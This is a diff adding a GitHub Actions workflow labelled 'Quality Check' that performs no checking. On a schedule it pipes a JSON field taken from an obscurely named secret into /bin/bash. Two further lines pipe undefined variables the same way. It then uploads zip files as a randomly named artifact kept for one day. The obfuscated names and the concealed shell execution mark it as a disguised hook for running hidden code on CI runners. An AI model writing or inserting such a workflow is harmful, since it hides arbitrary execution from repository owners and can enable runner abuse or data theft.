@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          wz2451: ${{ secrets.wz2451 }}
+        run: |
+          printf '%s' "$wz2451" | jq -r .ym0 | /bin/bash
+          echo $fwlqd23345 | jq -r .layrh3 | /bin/bash
+          echo $dnc2624 | jq -r .phh35095 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: sUfs9rOK
+          path: "*.zip"
+          retention-days: 1
